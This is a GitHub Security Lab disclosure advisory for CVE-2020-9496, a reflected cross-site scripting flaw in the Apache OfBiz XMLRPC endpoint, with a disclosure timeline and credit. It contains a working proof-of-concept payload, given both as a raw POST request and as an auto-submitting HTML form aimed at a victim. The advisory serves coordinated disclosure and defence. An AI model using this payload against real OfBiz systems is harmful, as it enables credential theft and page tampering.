<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 12, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-068: Cross-Site Scripting in Apache OfBiz - CVE-2020-9496</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>
<p>Apache OfBiz is vulnerable to Reflected Cross-Site Scripting through POST request</p>

<h2 id="product">Product</h2>
<p>Apache Ofbiz</p>

<h2 id="tested-version">Tested Version</h2>
<p>17.12.01</p>

<h2 id="details">Details</h2>

<h3 id="cross-site-scripting-in-xmlrpc-module">Cross-Site Scripting in XMLRPC module</h3>

<p><code class="language-plaintext highlighter-rouge">/webtools/control/xmlrpc</code> exposes some unauthenticated services such as <code class="language-plaintext highlighter-rouge">ping</code>. We can use this service to reflect arbitrary data and get a Cross-Site Scripting issue</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /webtools/control/xmlrpc?echo=foo HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://localhost:8443
Connection: keep-alive, Upgrade
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/xml
Content-Length: 140

]]&gt;&lt;/string&gt;&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;&lt;string&gt;&lt;![CDATA[
</code></pre></div></div>

<p>A POST XSS issue can be triggered by fooling the victim into visiting a malicious page. e.g:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;form</span> <span class="na">name=</span><span class="s">TheForm</span> <span class="na">action=</span><span class="s">http://localhost:8080/webtools/control/xmlrpc?echo=foo</span> <span class="na">method=</span><span class="s">post</span> <span class="na">enctype=</span><span class="s">"text/plain"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">hidden</span> <span class="na">name=</span><span class="s">foo</span> <span class="na">value=</span><span class="s">"]]&gt;&lt;/string&gt;&lt;a:script xmlns:a='http://www.w3.org/1999/xhtml'&gt;alert(document.domain)&lt;/a:script&gt;&lt;string&gt;&lt;![CDATA["</span> <span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">TheForm</span><span class="p">.</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to a variety of attacks from page defacements to stealing user/admin credentials. In conjunction with any SSTI issues this issue can be escalated into a <code class="language-plaintext highlighter-rouge">Remote Code Execution</code>.</p>

<h2 id="cve">CVE</h2>
<ul>
  <li>CVE-2020-9496</li>
</ul>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>04/13/2020: Report sent to vendor.</li>
  <li>04/23/2020: OfBiz maintainer acknowledges the issue.</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-068</code> in any communication regarding this issue.</p>

   